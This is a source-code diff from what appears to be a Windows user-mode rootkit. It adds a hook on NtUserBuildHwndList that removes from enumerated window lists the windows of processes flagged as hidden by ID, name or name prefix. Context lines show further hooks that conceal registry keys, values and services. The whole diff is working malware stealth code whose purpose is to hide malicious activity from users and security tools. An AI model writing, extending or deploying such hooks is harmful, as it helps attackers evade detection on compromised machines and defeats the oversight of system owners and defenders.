@@ -16,6 +16,7 @@ static NT_NTQUERYDIRECTORYFILEEX OriginalNtQueryDirectoryFileEx;
 static NT_NTQUERYKEY OriginalNtQueryKey;
 static NT_NTENUMERATEKEY OriginalNtEnumerateKey;
 static NT_NTENUMERATEVALUEKEY OriginalNtEnumerateValueKey;
+static NT_NTUSERBUILDHWNDLIST OriginalNtUserBuildHwndList;
 static NT_ENUMSERVICEGROUPW OriginalEnumServiceGroupW;
 static NT_ENUMSERVICESSTATUSEXW OriginalEnumServicesStatusExW;
 static NT_ENUMSERVICESSTATUSEXW OriginalEnumServicesStatusExW2;
@@ -44,6 +45,7 @@ VOID InitializeHooks()
 	InstallHook("ntdll.dll", "NtQueryKey", (LPVOID*)&OriginalNtQueryKey, HookedNtQueryKey);
 	InstallHook("ntdll.dll", "NtEnumerateKey", (LPVOID*)&OriginalNtEnumerateKey, HookedNtEnumerateKey);
 	InstallHook("ntdll.dll", "NtEnumerateValueKey", (LPVOID*)&OriginalNtEnumerateValueKey, HookedNtEnumerateValueKey);
+	InstallHook("win32u.dll", "NtUserBuildHwndList", (LPVOID*)&OriginalNtUserBuildHwndList, HookedNtUserBuildHwndList);
 	InstallHook("advapi32.dll", "EnumServiceGroupW", (LPVOID*)&OriginalEnumServiceGroupW, HookedEnumServiceGroupW);
 	InstallHook("advapi32.dll", "EnumServicesStatusExW", (LPVOID*)&OriginalEnumServicesStatusExW, HookedEnumServicesStatusExW);
 	InstallHook("sechost.dll", "EnumServicesStatusExW", (LPVOID*)&OriginalEnumServicesStatusExW2, HookedEnumServicesStatusExW2);
@@ -79,6 +81,7 @@ VOID UninitializeHooks()
 	UninstallHook(OriginalNtQueryKey, HookedNtQueryKey);
 	UninstallHook(OriginalNtEnumerateKey, HookedNtEnumerateKey);
 	UninstallHook(OriginalNtEnumerateValueKey, HookedNtEnumerateValueKey);
+	UninstallHook(OriginalNtUserBuildHwndList, HookedNtUserBuildHwndList);
 	UninstallHook(OriginalEnumServiceGroupW, HookedEnumServiceGroupW);
 	UninstallHook(OriginalEnumServicesStatusExW, HookedEnumServicesStatusExW);
 	UninstallHook(OriginalEnumServicesStatusExW2, HookedEnumServicesStatusExW2);
@@ -528,6 +531,35 @@ static NTSTATUS NTAPI HookedNtEnumerateValueKey(HANDLE key, ULONG index, NT_KEY_
 	TlsSetValue(TlsNtEnumerateValueKeyCacheCorrectedIndex, correctedIndex);
 
 	return OriginalNtEnumerateValueKey(key, correctedIndex, keyValueInformationClass, keyValueInformation, keyValueInformationLength, resultLength);
+}
+static NTSTATUS NTAPI HookedNtUserBuildHwndList(HDESK desktop, HWND hwndNext, BOOL enumChildren, BOOL removeImmersive, DWORD threadID, ULONG maxItems, HWND *itemBuffer, PULONG itemCount)
+{
+	NTSTATUS status = OriginalNtUserBuildHwndList(desktop, hwndNext, enumChildren, removeImmersive, threadID, maxItems, itemBuffer, itemCount);
+
+	if (NT_SUCCESS(status) && itemBuffer && itemCount)
+	{
+		WCHAR processName[MAX_PATH + 1];
+
+		for (ULONG i = 0; i < *itemCount; i++)
+		{
+			DWORD processId = 0;
+			if (GetWindowThreadProcessId(itemBuffer[i], &processId) && processId)
+			{
+				processName[0] = L'\0';
+				GetProcessFileName(processId, processName, MAX_PATH);
+
+				// If hidden, move all following entries up by one and decrease count.
+				if (IsProcessIdHidden(processId) || IsProcessNameHidden(processName) || HasPrefix(processName))
+				{
+					memmove(&itemBuffer[i], &itemBuffer[i + 1], (*itemCount - i - 1) * sizeof(HWND));
+					(*itemCount)--;
+					i--;
+				}
+			}
+		}
+	}
+
+	return status;
 }
 static BOOL WINAPI HookedEnumServiceGroupW(SC_HANDLE serviceManager, DWORD serviceType, DWORD serviceState, LPBYTE services, DWORD servicesLength, LPDWORD bytesNeeded, LPDWORD servicesReturned, LPDWORD resumeHandle, LPVOID reserved)
 {
